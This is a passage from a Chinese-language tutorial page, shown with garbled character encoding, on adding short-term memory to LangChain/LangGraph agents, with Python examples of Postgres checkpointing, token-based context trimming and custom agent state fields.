<span class="hljs-comment"># å®šä¹‰å·¥å…·å‡½æ•°ï¼šæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯</span>
<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_info</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ï¼Œè¿”å›å§“åã€å¹´é¾„ã€çˆ±å¥½"""</span>
    user_db = {
        <span class="hljs-string">"é™ˆæ˜"</span>: {<span class="hljs-string">"age"</span>: <span class="hljs-number">28</span>, <span class="hljs-string">"hobby"</span>: <span class="hljs-string">"æ—…æ¸¸ã€æ»‘é›ªã€å–èŒ¶"</span>},
        <span class="hljs-string">"å¼ ä¸‰"</span>: {<span class="hljs-string">"age"</span>: <span class="hljs-number">32</span>, <span class="hljs-string">"hobby"</span>: <span class="hljs-string">"ç¼–ç¨‹ã€é˜…è¯»ã€ç”µå½±"</span>}
    }
    info = user_db.get(name, {<span class="hljs-string">"age"</span>: <span class="hljs-string">"æœªçŸ¥"</span>, <span class="hljs-string">"hobby"</span>: <span class="hljs-string">"æœªçŸ¥"</span>})
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"å§“å: <span class="hljs-subst">{name}</span>, å¹´é¾„: <span class="hljs-subst">{info[<span class="hljs-string">'age'</span>]}</span>å², çˆ±å¥½: <span class="hljs-subst">{info[<span class="hljs-string">'hobby'</span>]}</span>"</span>

<span class="hljs-comment"># åˆ›å»ºæ¨¡å‹</span>
model = load_chat_model(model=<span class="hljs-string">"gpt-4o-mini"</span>,provider=<span class="hljs-string">"openai"</span>)

<span class="hljs-comment"># æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²</span>
DB_URI = <span class="hljs-string">"postgresql://myuser:123456@localhost:5432/mydatabase"</span>

<span class="hljs-comment"># ä½¿ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨ç¡®ä¿è¿æ¥æ­£ç¡®å…³é—­</span>
<span class="hljs-keyword">with</span> PostgresSaver.from_conn_string(DB_URI) <span class="hljs-keyword">as</span> checkpointer:
    <span class="hljs-comment"># è‡ªåŠ¨åˆ›å»ºè¡¨ç»“æ„ï¼ˆä»…é¦–æ¬¡è¿è¡Œï¼‰</span>
    checkpointer.setup()

    <span class="hljs-comment"># åˆ›å»ºæ™ºèƒ½ä½“</span>
    agent = create_agent(
        model=model,
        tools=[get_user_info],
        checkpointer=checkpointer
    )

    <span class="hljs-comment"># é…ç½®çº¿ç¨‹ IDï¼ˆç”¨äºåŒºåˆ†ä¸åŒç”¨æˆ·ï¼‰</span>
    config = {<span class="hljs-string">"configurable"</span>: {<span class="hljs-string">"thread_id"</span>: <span class="hljs-string">"production_user_001"</span>}}

    <span class="hljs-comment"># æ¨¡æ‹Ÿç”¨æˆ·æ³¨å†Œæµç¨‹</span>
    agent.invoke(
        {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"æˆ‘æ˜¯æ–°ç”¨æˆ·å¼ ä¸‰ï¼Œè¯·è®°å½•æˆ‘çš„ä¿¡æ¯"</span>}]},
        config=config
    )

    response = agent.invoke(
        {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"æˆ‘æ˜¯è°ï¼Ÿ"</span>}]},
        config=config
    )
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"AI: <span class="hljs-subst">{response[<span class="hljs-string">'messages'</span>][-<span class="hljs-number">1</span>].content}</span>"</span>)
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ff735446751467d9023db2e3cbe5bf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386048&amp;x-signature=RC%2FIdunMCR1NUw4r58V0%2BZ5fk1U%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-4">ä¸Šä¸‹æ–‡è£å‰ª</h3>
<blockquote>
<p>å¯ç”¨çŸ­æœŸè®°å¿†åï¼Œé•¿å¯¹è¯å¯èƒ½ä¼šè¶…å‡ºLLMçš„ä¸Šä¸‹æ–‡çª—å£</p>
</blockquote>
<ul>
<li>éœ€è¦é…åˆ <code>trim_messages</code> ä½¿ç”¨</li>
<li><strong>start_on="human"</strong>: è¿™æ˜¯ä¸€ä¸ªå¾ˆç»†èŠ‚çš„æœ€ä½³å®è·µã€‚å¦‚æœæˆªæ–­å¯¼è‡´ç¬¬ä¸€æ¡æ¶ˆæ¯æ˜¯ AI çš„å›å¤ï¼ˆæ²¡æœ‰å¯¹åº”çš„ User é—®é¢˜ï¼‰ï¼ŒæŸäº›æ¨¡å‹ä¼šæ„Ÿåˆ°å›°æƒ‘ã€‚è¿™ä¸ªå‚æ•°ç¡®ä¿æˆªæ–­åçš„å¯¹è¯æ€»æ˜¯ä»¥ User å¼€å§‹ã€‚</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ============ æ ¸å¿ƒæ¨¡å—å¯¼å…¥ ============</span>
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> langchain.chat_models <span class="hljs-keyword">import</span> init_chat_model
<span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> create_agent
<span class="hljs-keyword">from</span> langchain_core.tools <span class="hljs-keyword">import</span> tool
<span class="hljs-keyword">from</span> langgraph.checkpoint.memory <span class="hljs-keyword">import</span> InMemorySaver  <span class="hljs-comment"># çŸ­æœŸè®°å¿†å­˜å‚¨</span>
<span class="hljs-keyword">from</span> langchain_core.messages <span class="hljs-keyword">import</span> trim_messages  <span class="hljs-comment"># æ¶ˆæ¯è£å‰ªå·¥å…·</span>
<span class="hljs-keyword">from</span> langchain_core.messages <span class="hljs-keyword">import</span> HumanMessage, AIMessage, SystemMessage

<span class="hljs-comment"># ============ åˆå§‹åŒ– LLM ä¸å·¥å…· ============</span>
model = init_chat_model(
    model=<span class="hljs-string">"gpt-4o-mini"</span>,
    model_provider=<span class="hljs-string">"openai"</span>,
    temperature=<span class="hljs-number">0.7</span>
)

<span class="hljs-comment"># 1. å®šä¹‰å¤©æ°”æŸ¥è¯¢å·¥å…·</span>
<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">search_weather</span>(<span class="hljs-params">city: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""æŸ¥è¯¢åŸå¸‚å¤©æ°”"""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{city}</span>å¤©æ°”ï¼šæ™´ï¼Œ25Â°C"</span>

<span class="hljs-comment"># ============ é…ç½®è£å‰ªå‚æ•° ============</span>
MAX_TOKENS = <span class="hljs-number">100</span>  <span class="hljs-comment"># æ ¹æ®æ¨¡å‹ä¸Šä¸‹æ–‡é•¿åº¦è°ƒæ•´ï¼Œä¸Šä¸‹æ–‡128Kçš„è¯ï¼Œä¸€èˆ¬è®¾ç½®ä¸º4000å·¦å³</span>
TRIM_STRATEGY = <span class="hljs-string">"last"</span>  <span class="hljs-comment"># ä¿ç•™æœ€æ–°æ¶ˆæ¯</span>
INCLUDE_SYSTEM = <span class="hljs-literal">True</span>  <span class="hljs-comment"># ç³»ç»Ÿæ¶ˆæ¯ä¸å‚ä¸è£å‰ª</span>

<span class="hljs-string">"""
tiktoken æ˜¯ OpenAI å®˜æ–¹ token ç¼–ç åº“ï¼Œæ”¯æŒç²¾ç¡®è®¡æ•°ã€‚
ä¸åŒæ¨¡å‹éœ€ä½¿ç”¨ä¸åŒç¼–ç ï¼š
- gpt-4o, gpt-4o-mini: o200k_base
- gpt-4-turbo: cl100k_base
- text-davinci-003: p50k_base
"""</span>
<span class="hljs-keyword">import</span> tiktoken

<span class="hljs-comment"># 2. å®šä¹‰ Token ç¼–ç å™¨è·å–å‡½æ•°</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_token_encoder</span>(<span class="hljs-params">model_name: <span class="hljs-built_in">str</span> = <span class="hljs-string">"gpt-4o-mini"</span></span>):
    <span class="hljs-string">"""è·å– tiktoken ç¼–ç å™¨å®ä¾‹"""</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># è‡ªåŠ¨æ˜ å°„æ¨¡å‹åˆ°ç¼–ç å™¨</span>
        encoding = tiktoken.encoding_for_model(model_name)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âœ… å·²åŠ è½½æ¨¡å‹ '<span class="hljs-subst">{model_name}</span>' çš„ tiktoken ç¼–ç å™¨"</span>)
        <span class="hljs-keyword">return</span> encoding
    <span class="hljs-keyword">except</span> KeyError:
        <span class="hljs-comment"># å¦‚æœæ¨¡å‹ä¸åœ¨å®˜æ–¹åˆ—è¡¨ï¼Œä½¿ç”¨é»˜è®¤ç¼–ç </span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âš ï¸  æ¨¡å‹ '<span class="hljs-subst">{model_name}</span>' æœªåœ¨æ˜ å°„è¡¨ä¸­ï¼Œä½¿ç”¨é»˜è®¤ç¼–ç  'o200k_base'"</span>)
        <span class="hljs-keyword">return</span> tiktoken.get_encoding(<span class="hljs-string">"o200k_base"</span>)

<span class="hljs-comment"># 3. åˆå§‹åŒ–ç¼–ç å™¨ï¼ˆå…¨å±€å¤ç”¨æå‡æ€§èƒ½ï¼‰</span>
TOKEN_ENCODER = get_token_encoder(<span class="hljs-string">"gpt-4o-mini"</span>)

<span class="hljs-comment"># ============ 2. ç²¾ç¡® Token è®¡æ•°å‡½æ•° ============</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">count_tokens_tiktoken</span>(<span class="hljs-params">messages</span>):
    <span class="hljs-string">"""
    ä½¿ç”¨ tiktoken ç²¾ç¡®è®¡ç®—æ¶ˆæ¯åˆ—è¡¨çš„ token æ€»æ•°

    å‚æ•°:
        messages: List[BaseMessage] - æ¶ˆæ¯å¯¹è±¡åˆ—è¡¨

    è¿”å›:
        int: æ€» token æ•°

    è¯´æ˜:
        - æ¯ä¸ªæ¶ˆæ¯åŒ…å«è§’è‰²ã€å†…å®¹å’Œå…ƒæ•°æ®ï¼Œéœ€å®Œæ•´ç¼–ç 
        - ä¸åŒæ¶ˆæ¯æ ¼å¼ï¼ˆHuman/AI/Systemï¼‰çš„ token å¼€é”€ä¸åŒ
        - æ­¤å‡½æ•°æ¨¡æ‹ŸçœŸå® API è°ƒç”¨çš„ token è®¡æ•°é€»è¾‘
    """</span>
    total_tokens = <span class="hljs-number">0</span>

    <span class="hljs-comment"># éå†æ¯æ¡æ¶ˆæ¯ï¼Œç´¯åŠ  token æ•°</span>
    <span class="hljs-keyword">for</span> message <span class="hljs-keyword">in</span> messages:
        <span class="hljs-comment"># æ¶ˆæ¯æ ¼å¼ï¼šrole + content + ç‰¹æ®Šæ ‡è®°</span>
        <span class="hljs-comment"># å…¸å‹æ ¼å¼ï¼š&lt;|im_start|&gt;role&lt;|im_end|&gt;content&lt;|im_end|&gt;</span>

        <span class="hljs-comment"># è§’è‰² tokenï¼ˆå¦‚ "user", "assistant", "system"ï¼‰</span>
        role_tokens = <span class="hljs-built_in">len</span>(TOKEN_ENCODER.encode(message.<span class="hljs-built_in">type</span>))

        <span class="hljs-comment"># å†…å®¹ tokenï¼ˆæ¶ˆæ¯æ­£æ–‡ï¼‰</span>
        content_tokens = <span class="hljs-built_in">len</span>(TOKEN_ENCODER.encode(message.content))

        <span class="hljs-comment"># æ ¼å¼å¼€é”€ï¼ˆOpenAI æ¶ˆæ¯è¾¹ç•Œæ ‡è®°ï¼‰</span>
        <span class="hljs-comment"># æ¯æ¡çº¦ 4 ä¸ªç‰¹æ®Š tokenï¼ˆå¼€å§‹ã€è§’è‰²ã€ç»“æŸã€å†…å®¹ç»“æŸï¼‰</span>
        format_overhead = <span class="hljs-number">4</span>

        total_tokens += role_tokens + content_tokens + format_overhead

    <span class="hljs-keyword">return</span> total_tokens

<span class="hljs-comment"># ============ åˆ›å»ºAgent ============</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_trimmed_agent</span>():
    <span class="hljs-string">"""åˆ›å»º Agent å¹¶é…ç½® InMemorySaver"""</span>
    memory = InMemorySaver()

    agent = create_agent(
        model=model,
        tools=[search_weather],
        system_prompt=<span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªç®€æ´çš„åŠ©æ‰‹ï¼Œè®°ä½ç”¨æˆ·æåˆ°çš„åŸå¸‚åç§°"</span>,
        checkpointer=memory  <span class="hljs-comment"># å¯ç”¨çŸ­æœŸè®°å¿†</span>
    )

    <span class="hljs-keyword">return</span> agent

<span class="hljs-comment"># ============ æ‰‹åŠ¨è£å‰ªå¹¶è°ƒç”¨ Agent ============</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">invoke_with_trim</span>(<span class="hljs-params">agent, user_input: <span class="hljs-built_in">str</span>, config: <span class="hljs-built_in">dict</span></span>):
    <span class="hljs-string">"""
    åœ¨è°ƒç”¨ Agent å‰æ‰‹åŠ¨è£å‰ªä¸Šä¸‹æ–‡

    æµç¨‹ï¼š
    1. è·å–å½“å‰çŠ¶æ€ï¼ˆæ‰€æœ‰å†å²æ¶ˆæ¯ï¼‰
    2. ä½¿ç”¨ trim_messages è£å‰ª
    3. æ„å»ºæ–°è¾“å…¥ï¼ˆè£å‰ªåçš„æ¶ˆæ¯ + æ–°æ¶ˆæ¯ï¼‰
    4. è°ƒç”¨ Agent
    """</span>
    <span class="hljs-comment"># 1. è·å–å½“å‰è®°å¿†çŠ¶æ€</span>
    state = agent.get_state(config)
    existing_messages = state.values.get(<span class="hljs-string">"messages"</span>, []) <span class="hljs-keyword">if</span> state <span class="hljs-keyword">else</span> []

    <span class="hljs-comment"># ç²¾ç¡®è®¡ç®—å½“å‰ token æ•°</span>
    current_tokens = count_tokens_tiktoken(existing_messages)

    <span class="hljs-comment"># 2. å¦‚æœæœ‰å†å²æ¶ˆæ¯ï¼Œå…ˆè£å‰ª</span>
    <span class="hljs-keyword">if</span> existing_messages:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è£å‰ªå‰æ¶ˆæ¯æ•°: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(existing_messages)}</span>"</span>)

        <span class="hljs-comment"># æ ¸å¿ƒï¼šè°ƒç”¨ trim_messages è¿›è¡Œè£å‰ª</span>
        trimmed_messages = trim_messages(
            existing_messages,                    <span class="hljs-comment"># å¾…è£å‰ªçš„æ¶ˆæ¯åˆ—è¡¨</span>
            max_tokens=MAX_TOKENS,                <span class="hljs-comment"># å…è®¸çš„æœ€å¤§ token æ•°ï¼Œè¶…è¿‡åˆ™è§¦å‘è£å‰ª</span>
            token_counter=count_tokens_tiktoken,  <span class="hljs-comment"># token è®¡æ•°å‡½æ•°</span>
            strategy=TRIM_STRATEGY,               <span class="hljs-comment"># è£å‰ªç­–ç•¥ï¼Œ"last" ä¿ç•™æœ€æ–°æ¶ˆæ¯ï¼Œ"first" ä¿ç•™æœ€æ—©æ¶ˆæ¯</span>
            include_system=INCLUDE_SYSTEM,        <span class="hljs-comment"># æ˜¯å¦ä¿ç•™ç³»ç»Ÿæ¶ˆæ¯ï¼ˆé€šå¸¸å¿…é¡»ä¿ç•™ï¼‰</span>
            allow_partial=<span class="hljs-literal">False</span>,                  <span class="hljs-comment"># Falseä¸å…è®¸éƒ¨åˆ†æ¶ˆæ¯ï¼Œä¼šå°è¯•ä¿ç•™æ¶ˆæ¯çš„å®Œæ•´æ€§ã€‚å¦‚æœæ— æ³•åœ¨ä¿æŒæ¶ˆæ¯å®Œæ•´æ€§çš„å‰æä¸‹å°†æ€»tokenæ•°è£å‰ªåˆ°å‚æ•° max_tokens ä»¥å†…ï¼Œå°±ä¼šè¿”å› ç©ºåˆ—è¡¨</span>
            start_on=<span class="hljs-string">"human"</span>                      <span class="hljs-comment"># ä» human æ¶ˆæ¯å¼€å§‹è£å‰ª</span>
        )

        <span class="hljs-comment"># è®¡ç®—è£å‰ªåçš„ token æ•°</span>
        new_tokens = count_tokens_tiktoken(trimmed_messages)

        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è£å‰ªå token: <span class="hljs-subst">{new_tokens}</span>ï¼Œè£å‰ªåæ¶ˆæ¯æ•°: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(trimmed_messages)}</span>"</span>)
    <span class="hljs-keyword">else</span>:
        trimmed_messages = []

    <span class="hljs-comment"># 3. æ·»åŠ æ–°æ¶ˆæ¯</span>
    new_messages = trimmed_messages + [HumanMessage(content=user_input)]

    <span class="hljs-comment"># 4. è°ƒç”¨ Agentï¼ˆcheckpointer ä¼šè‡ªåŠ¨ä¿å­˜æ–°çŠ¶æ€ï¼‰</span>
    response = agent.invoke(
        {<span class="hljs-string">"messages"</span>: new_messages},
        config=config
    )

    <span class="hljs-keyword">return</span> response

<span class="hljs-comment"># ============ æ¼”ç¤ºå¤šè½®å¯¹è¯ä¸è£å‰ª ============</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">demo_manual_trim</span>():
    <span class="hljs-string">"""æ¼”ç¤ºæ‰‹åŠ¨è£å‰ªä¸Šä¸‹æ–‡çš„å¤šè½®å¯¹è¯"""</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"åœºæ™¯ï¼šæ‰‹åŠ¨ trim_messages + InMemorySaver"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)

    agent = create_trimmed_agent()
    config = {<span class="hljs-string">"configurable"</span>: {<span class="hljs-string">"thread_id"</span>: <span class="hljs-string">"trim_user_001"</span>}}

    <span class="hljs-comment"># æ¨¡æ‹Ÿå¤šè½®å¯¹è¯</span>
    conversations = [
        <span class="hljs-string">"ä½ å¥½ï¼Œæˆ‘å«é™ˆæ˜"</span>,
        <span class="hljs-string">"æŸ¥è¯¢åŒ—äº¬å¤©æ°”"</span>,
        <span class="hljs-string">"ä¸Šæµ·å‘¢ï¼Ÿ"</span>,
        <span class="hljs-string">"æ˜å¤©åŒ—äº¬å¤©æ°”å¦‚ä½•ï¼Ÿ"</span>,  <span class="hljs-comment"># æ­¤æ—¶ä¼šè§¦å‘è£å‰ª</span>
        <span class="hljs-string">"æˆ‘æ˜¯è°ï¼Ÿ"</span>,  <span class="hljs-comment"># æµ‹è¯•è®°å¿†æ˜¯å¦ä¿ç•™</span>
    ]

    <span class="hljs-keyword">for</span> i, query <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(conversations, <span class="hljs-number">1</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n--- ç¬¬ <span class="hljs-subst">{i}</span> è½® ---"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç”¨æˆ·: <span class="hljs-subst">{query}</span>"</span>)

        <span class="hljs-comment"># æ¯æ¬¡è°ƒç”¨å‰è‡ªåŠ¨è£å‰ª</span>
        response = invoke_with_trim(agent, query, config)

        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"AI: <span class="hljs-subst">{response[<span class="hljs-string">'messages'</span>][-<span class="hljs-number">1</span>].content}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">40</span>)

<span class="hljs-comment"># ============ è¿è¡Œæ¼”ç¤º ============</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    demo_manual_trim()
</code></pre>
<h3 data-id="heading-5">è‡ªå®šä¹‰Stateæ‰©å±•</h3>
<blockquote>
<p>åœ¨ LangGraph ä¸­ï¼ŒAgentState æ˜¯ä¸€ä¸ª TypedDictï¼Œå®šä¹‰äº† Agent æ‰§è¡Œè¿‡ç¨‹ä¸­æµè½¬çš„æ•°æ®ç»“æ„ã€‚æ‰©å±• State = åœ¨åŸºç¡€ç»“æ„ä¸Šå¢åŠ è‡ªå®šä¹‰å­—æ®µï¼Œç”¨äºæºå¸¦æ›´å¤šä¸Šä¸‹æ–‡å’Œä¸šåŠ¡æ•°æ®ã€‚</p>
<p>æ‰©å±• State çš„æœ¬è´¨ï¼šåœ¨ LangGraph ä¸­ï¼ŒState æ˜¯ Agent çš„  "å†…å­˜"  å’Œ "æ¶ˆæ¯æ€»çº¿" ï¼Œæ‰©å±•å®ƒå°±åƒç»™ç¨‹åºå¢åŠ æ–°çš„å…¨å±€å˜é‡ï¼Œä½†è¿™äº›å˜é‡éšæ‰§è¡Œæµè‡ªåŠ¨æµè½¬ã€éš”ç¦»ã€æŒä¹…åŒ–ï¼Œæ˜¯å®ç°å¤æ‚ Agent é€»è¾‘çš„åŸºç¡€ã€‚</p>
</blockquote>
<p><strong>æ‰©å±•Stateæ ¸å¿ƒç›®çš„</strong></p>
<ul>
<li>è·¨æ­¥éª¤æŒä¹…åŒ–ä¸Šä¸‹æ–‡ï¼šAgent æ‰§è¡Œæ˜¯å¤šæ­¥éª¤çš„ï¼ˆLLMè°ƒç”¨ â†’ å·¥å…·è°ƒç”¨ â†’ ç»“æœè§£æï¼‰ï¼Œæ‰©å±•çš„ State å­—æ®µèƒ½åœ¨æ‰€æœ‰æ­¥éª¤é—´å…±äº«ã€‚</li>
<li>å®ç°æ¡ä»¶åˆ†æ”¯ä¸åŠ¨æ€è·¯ç”±ï¼šæ ¹æ® State ä¸­çš„å­—æ®µå€¼ï¼Œå†³å®š Agent çš„ä¸‹ä¸€æ­¥èµ°å‘ã€‚</li>
<li>æ”¯æŒå¤šæ¨¡æ€ä¸å¤æ‚è¾“å…¥ï¼šç°ä»£ Agent éœ€è¦å¤„ç†å›¾ç‰‡ã€æ–‡ä»¶ç­‰éæ–‡æœ¬æ•°æ®ï¼Œæ‰©å±•åˆ° State ä¸­ã€‚</li>
<li>å®ç°è®°å¿†ä¸æŒä¹…åŒ–ï¼šæ‰©å±•å­—æ®µç”¨äºå­˜å‚¨é•¿æœŸè®°å¿†ï¼Œè·¨ä¼šè¯ä¿æŒã€‚</li>
<li>æ€§èƒ½ç›‘æ§ä¸è°ƒè¯•ï¼šæ‰©å±•å­—æ®µç”¨äºè®°å½•æ€§èƒ½æŒ‡æ ‡ï¼Œä¾¿äºåˆ†æä¼˜åŒ–ã€‚</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ExtendedState</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    messages: <span class="hljs-built_in">list</span>[BaseMessage]
    user_id: <span class="hljs-built_in">str</span>           <span class="hljs-comment"># æ‰©å±•ï¼šç”¨æˆ·èº«ä»½ï¼Œç”¨äºæƒé™æ§åˆ¶å’Œä¸ªæ€§åŒ–</span>
    session_id: <span class="hljs-built_in">str</span>        <span class="hljs-comment"># æ‰©å±•ï¼šä¼šè¯æ ‡è¯†ï¼Œç”¨äºå¯¹è¯å†å²ç®¡ç†</span>
    retry_count: <span class="hljs-built_in">int</span>       <span class="hljs-comment"># æ‰©å±•ï¼šé‡è¯•æ¬¡æ•°ï¼Œç”¨äºé”™è¯¯å¤„ç†ç­–ç•¥</span>
    original_query: <span class="hljs-built_in">str</span>    <span class="hljs-comment"># æ‰©å±•ï¼šåŸå§‹æŸ¥è¯¢ï¼Œç”¨äºæ—¥å¿—å’Œå®¡è®¡</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ============ è‡ªå®šä¹‰ State æ‰©å±• ============</span>
<span class="hljs-string">"""
é€šè¿‡ TypedDict æ‰©å±• AgentStateï¼Œæ·»åŠ ä¸šåŠ¡å­—æ®µï¼ˆç”¨æˆ·IDã€åå¥½ç­‰ï¼‰ã€‚
LangChain 1.0 æ¨èä½¿ç”¨ TypedDict è€Œé Pydanticã€‚
"""</span>
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> TypedDict, <span class="hljs-type">Optional</span>
<span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> AgentState, create_agent
<span class="hljs-keyword">from</span> langgraph.checkpoint.memory <span class="hljs-keyword">import</span> InMemorySaver

<span class="hljs-comment"># å®šä¹‰è‡ªå®šä¹‰ State ç»“æ„</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomAgentState</span>(<span class="hljs-title class_ inherited__">AgentState</span>):
    <span class="hljs-string">"""æ‰©å±•çš„ Agent çŠ¶æ€ï¼ŒåŒ…å«ä¸šåŠ¡ä¸Šä¸‹æ–‡"""</span>
    user_id: <span class="hljs-built_in">str</span>  <span class="hljs-comment"># ç”¨æˆ·å”¯ä¸€æ ‡è¯†</span>
    preferences: <span class="hljs-built_in">dict</span>  <span class="hljs-comment"># ç”¨æˆ·åå¥½ï¼ˆä¸»é¢˜ã€è¯­è¨€ç­‰ï¼‰</span>
    visit_count: <span class="hljs-built_in">int</span>  <span class="hljs-comment"># è®¿é—®æ¬¡æ•°</span>

<span class="hljs-comment"># ============ å®šä¹‰å¸¦çŠ¶æ€è®¿é—®çš„å·¥å…· ============</span>
<span class="hljs-keyword">from</span> langchain.tools <span class="hljs-keyword">import</span> ToolRuntime
<span class="hljs-keyword">from</span> langgraph.types <span class="hljs-keyword">import</span> Command
<span class="hljs-keyword">from</span> langchain.messages <span class="hljs-keyword">import</span> ToolMessage

<span class="hljs-comment"># å®šä¹‰å·¥å…·å‡½æ•°ï¼šæ›´æ–°ç”¨æˆ·åå¥½</span>
<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user_preference</span>(<span class="hljs-params">runtime: ToolRuntime, theme: <span class="hljs-built_in">str</span></span>) -&gt; Command:
    <span class="hljs-string">"""
    æ›´æ–°ç”¨æˆ·ä¸»é¢˜åå¥½ï¼Œå†™å…¥çŸ­æœŸè®°å¿†

    ToolRuntime æä¾›å¯¹ state å’Œ context çš„è®¿é—®èƒ½åŠ›ï¼š
    - runtime.state: å½“å‰çŠ¶æ€ï¼ˆå«è‡ªå®šä¹‰å­—æ®µï¼‰
    - runtime.context: è°ƒç”¨ä¸Šä¸‹æ–‡
    - runtime.tool_call_id: å·¥å…·è°ƒç”¨ID
    """</span>
    <span class="hljs-comment"># ä»å½“å‰çŠ¶æ€è·å–åå¥½ï¼ˆå¦‚æœä¸å­˜åœ¨åˆ™åˆå§‹åŒ–ï¼‰</span>
    current_prefs = runtime.state.get(<span class="hljs-string">"preferences"</span>, {})
    current_prefs[<span class="hljs-string">"theme"</span>] = theme

    <span class="hljs-comment"># è¿”å› Command å¯¹è±¡ï¼ŒæŒ‡ç¤ºçŠ¶æ€æ›´æ–°</span>
    <span class="hljs-keyword">return</span> Command(update={
        <span class="hljs-string">"preferences"</span>: current_prefs,
        <span class="hljs-string">"messages"</span>: [
            ToolMessage(
                content=<span class="hljs-string">f"æˆåŠŸæ›´æ–°ä¸»é¢˜ä¸º: <span class="hljs-subst">{theme}</span>"</span>,
                tool_call_id=runtime.tool_call_id
            )
        ]
    })

<span class="hljs-comment"># å®šä¹‰å·¥å…·å‡½æ•°ï¼šæ ¹æ®ç”¨æˆ·åå¥½ç”Ÿæˆé—®å€™</span>
<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">greet_user</span>(<span class="hljs-params">runtime: ToolRuntime</span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""æ ¹æ®ç”¨æˆ·åå¥½ç”Ÿæˆä¸ªæ€§åŒ–é—®å€™"""</span>
    user_name = runtime.state.get(<span class="hljs-string">"user_id"</span>, <span class="hljs-string">"è®¿å®¢"</span>)
    prefs = runtime.state.get(<span class="hljs-string">"preferences"</span>, {})
    theme = prefs.get(<span class="hljs-string">"theme"</span>, <span class="hljs-string">"é»˜è®¤"</span>)

    <span class="hljs-keyword">return</span> <span class="hljs-string">f"æ¬¢è¿å›æ¥ï¼Œ<span class="hljs-subst">{user_name}</span>ï¼å½“å‰ä¸»é¢˜: <span class="hljs-subst">{theme}</span>"</span>

<span class="hljs-comment"># ============ åˆ›å»ºå¸¦è‡ªå®šä¹‰çŠ¶æ€çš„ Agent ============</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">demo_custom_state</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"åœºæ™¯ 3: è‡ªå®šä¹‰ State æ‰©å±•è®°å¿†ç»´åº¦"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)

    <span class="hljs-comment"># ä½¿ç”¨å†…å­˜å­˜å‚¨</span>
    checkpointer = InMemorySaver()

    <span class="hljs-comment"># åˆ›å»º Agentï¼ŒæŒ‡å®šè‡ªå®šä¹‰ state_schema</span>
    agent = create_agent(
        model=model,
        tools=[update_user_preference, greet_user],
        state_schema=CustomAgentState,  <span class="hljs-comment"># å…³é”®ï¼šä¼ å…¥è‡ªå®šä¹‰çŠ¶æ€ç±»å‹</span>
        checkpointer=checkpointer
    )

    <span class="hljs-comment"># é…ç½®çº¿ç¨‹ IDï¼ˆç”¨äºåŒºåˆ†ä¸åŒç”¨æˆ·ï¼‰</span>
